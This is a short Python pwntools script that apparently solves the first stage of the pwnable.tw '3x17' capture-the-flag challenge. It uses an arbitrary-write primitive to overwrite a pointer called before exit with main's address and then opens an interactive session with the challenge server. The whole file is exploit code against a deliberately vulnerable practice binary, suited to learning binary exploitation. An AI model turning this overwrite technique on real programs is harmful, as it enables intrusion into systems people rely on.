#!/usr/bin/env python3

from pwn import *

elf = ELF("./given/3x17")

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10105)
    else:
        p = process([elf.path])
        if args.D:
            gdb.attach(p, """
                    b *0x401c4c
                    """)
    return p

def arbit_write(addr, value, p):
    p.recvuntil(b"addr:")
    p.sendline(str(addr).encode('ascii'))

    p.recvuntil(b"data:")
    p.send(p64(value))

def exploit():
    # info: pwndbg & objdump
    func_main = 0x401b6d
    jump2_b4_exit = 0x4b6fd8 # in 0x40f6d6

    p = conn()
    arbit_write(jump2_b4_exit, func_main, p)
    p.interactive()

if __name__ == "__main__":
    exploit()
